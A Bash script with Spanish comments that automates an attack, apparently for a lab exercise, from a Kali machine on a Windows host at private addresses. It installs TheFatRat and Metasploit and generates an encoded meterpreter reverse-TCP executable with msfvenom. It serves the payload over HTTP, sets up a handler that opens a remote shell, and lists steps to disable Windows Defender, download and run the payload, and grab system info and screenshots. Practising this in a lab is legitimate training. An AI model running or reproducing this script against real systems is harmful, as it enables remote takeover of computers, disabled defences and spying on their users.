#!/usr/bin/env bash
# =============================================================
# ATAQUE COMPLETO - Kali Itmar (192.168.163.129)
# Contra Windows Bokul (192.168.163.130)
# =============================================================
# Ejecutar:  chmod +x ataque-total-kali.sh && sudo ./ataque-total-kali.sh
# =============================================================

set -euo pipefail

KALI_IP="192.168.163.129"
WIN_IP="192.168.163.130"
LPORT="4444"
PAYLOAD_DIR="$HOME/payloads"
LOG="/tmp/ataque-fatrat.log"
CAPTURAS="$HOME/capturas-fatrat"

mkdir -p "$PAYLOAD_DIR" "$CAPTURAS"
exec > >(tee -a "$LOG") 2>&1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; N='\033[0m'
info()  { echo -e "${G}[+]${N} $*"; }
warn()  { echo -e "${Y}[!]${N} $*"; }
err()   { echo -e "${R}[-]${N} $*"; }
header(){ echo -e "\n${C}══════════════════════════════════════════════${N}"; echo -e "${C}  $*${N}"; echo -e "${C}══════════════════════════════════════════════${N}"; }
captura(){ local n="$1"; shift; echo -e "${Y}[📸 CAPTURA $n]${N} $*"; }

header "ATAQUE COMPLETO: Kali Itmar → Windows Bokul"
info "Kali:     $KALI_IP"
info "Windows:  $WIN_IP"
info "Puerto:   $LPORT"
info "Log:      $LOG"
info "Capturas: $CAPTURAS"

# =============================================================
# PASO 1: VERIFICAR CONEXION
# =============================================================
header "[1] Verificando conexion con Windows Bokul"

captura 1 "Ping a Windows Bokul"
ping -c 2 "$WIN_IP" && info "Windows responde!" || warn "Windows NO responde - revisa firewall"

captura 2 "IP de Kali"
ip a | grep -E "inet.*$KALI_IP" || ip a | grep inet

# =============================================================
# PASO 2: INSTALAR DEPENDENCIAS
# =============================================================
header "[2] Instalando dependencias"

captura 3 "Instalando paquetes"
apt update -y
apt install -y curl wget git xterm metasploit-framework default-jdk default-jre mingw-w64 python3-pip ruby upx-ucl apache2 gnome-screenshot netcat-openbsd

# =============================================================
# PASO 3: INSTALAR THEFATRAT
# =============================================================
header "[3] Instalando TheFatRat"

captura 4 "Clonando TheFatRat"
if [[ -d /opt/TheFatRat ]]; then
    info "TheFatRat ya existe, actualizando..."
    cd /opt/TheFatRat && git pull
else
    git clone --depth=1 https://github.com/screetsec/TheFatRat.git /opt/TheFatRat
fi

cd /opt/TheFatRat
chmod +x setup.sh fatrat backdoor_apk powerfull.sh chk_tools

captura 5 "Instalando gems Ruby"
gem install --no-document bundler winrm winrm-fs colorize 2>/dev/null || true

captura 6 "Verificando herramientas (chk_tools)"
bash ./chk_tools 2>&1 | head -30

# =============================================================
# PASO 4: GENERAR PAYLOAD
# =============================================================
header "[4] Generando payload para Windows Bokul ($WIN_IP)"

captura 7 "Creando payload con msfvenom"
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=$KALI_IP LPORT=$LPORT \
    -e x86/shikata_ga_nai -i 5 \
    -f exe --platform windows -a x86 \
    -o "$PAYLOAD_DIR/payload.exe"

captura 8 "Payload generado"
ls -lh "$PAYLOAD_DIR/payload.exe"
file "$PAYLOAD_DIR/payload.exe"

# =============================================================
# PASO 5: INICIAR SERVIDOR HTTP PARA COMPARTIR PAYLOAD
# =============================================================
header "[5] Compartiendo payload por HTTP"

captura 9 "Iniciando servidor HTTP (puerto 8000)"
echo "URL para Windows: http://$KALI_IP:8000/payload.exe"
cd "$PAYLOAD_DIR"
python3 -m http.server 8000 &
HTTP_PID=$!
sleep 1
info "Servidor HTTP corriendo (PID: $HTTP_PID)"
info "En Windows Bokul ejecuta:"
echo ""
echo "  Invoke-WebRequest -Uri 'http://$KALI_IP:8000/payload.exe' -OutFile 'C:\payloads\payload.exe'"
echo "  C:\payloads\payload.exe"
echo ""

# =============================================================
# PASO 6: INICIAR LISTENER METASPLOIT
# =============================================================
header "[6] Iniciando listener Metasploit"

captura 10 "Listener Metasploit a punto de iniciar"
echo "Cuando ejecutes el payload en Windows, la sesion aparecera aqui."
echo "ABRE OTRA TERMINAL y ejecuta el script de la sesion:"
echo "  msfconsole -q -r /tmp/listener-fatrat.rc"
echo ""

# Guardar RC file
cat > /tmp/listener-fatrat.rc << RC
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT $LPORT
set ExitOnSession false
set SessionLogging true
set AutoRunScript post/windows/manage/migrate
exploit -j -z
RC

info "Archivo RC creado: /tmp/listener-fatrat.rc"
info ""
info "========== INSTRUCCIONES =========="
info "ABRE UNA SEGUNDA TERMINAL y ejecuta:"
info "  msfconsole -q -r /tmp/listener-fatrat.rc"
info ""
info "LUEGO en Windows Bokul (PowerShell Admin):"
info "  1. Set-MpPreference -DisableRealtimeMonitoring \$true"
info "  2. mkdir C:\\payloads -Force"
info "  3. Invoke-WebRequest -Uri 'http://$KALI_IP:8000/payload.exe' -OutFile 'C:\\payloads\\payload.exe'"
info "  4. C:\\payloads\\payload.exe"
info ""
info "UNA VEZ CONECTADO, en Metasploit ejecuta:"
info "  sessions -i 1"
info "  sysinfo"
info "  getuid"
info "  screenshot"
info "  shell"
info ""
info "PRESIONA ENTER CUANDO LA SESION ESTE ACTIVA"
read -r

# =============================================================
# PASO 7: INTERACTUAR CON LA SESION
# =============================================================
header "[7] Sesion comprometida - mostrando informacion"

# Buscar sesiones activas
SESSIONS=$(msfconsole -q -x "sessions -l" -r /tmp/listener-fatrat.rc 2>/dev/null || echo "")

captura 11 "Sysinfo de Windows Bokul"
msfconsole -q -x "
sessions -i 1
sysinfo
getuid
screenshot
" -r /tmp/listener-fatrat.rc 2>/dev/null || warn "Ejecuta manualmente: msfconsole -q -r /tmp/listener-fatrat.rc"

captura 12 "Captura de pantalla del escritorio victima"
ls -lh /root/*.jpeg /root/*.png 2>/dev/null || echo "La captura se guarda en /root/ cuando ejecutes screenshot"

# =============================================================
# PASO 8: LIMPIEZA
# =============================================================
header "[8] Limpieza"

kill $HTTP_PID 2>/dev/null || true
info "Servidor HTTP detenido"

captura 13 "Resumen final"
echo ""
echo "═══════════════════════════════════════════════════"
echo "  ATAQUE COMPLETADO"
echo "═══════════════════════════════════════════════════"
echo ""
echo "📌 Resumen:"
echo "  Kali Itmar:     $KALI_IP"
echo "  Windows Bokul:  $WIN_IP (COMPROMETIDO)"
echo "  Payload:        $PAYLOAD_DIR/payload.exe"
echo "  Puerto:         $LPORT"
echo "  Log completo:   $LOG"
echo "  Capturas:       $CAPTURAS"
echo ""
echo "📸 Capturas tomadas:"
for i in $(seq 1 13); do
    echo "  Captura $i"
done
echo ""
echo "🔄 Para repetir el ataque:"
echo "  sudo bash $0"
echo ""
echo "🔄 Para reiniciar listener:"
echo "  msfconsole -q -r /tmp/listener-fatrat.rc"
echo ""
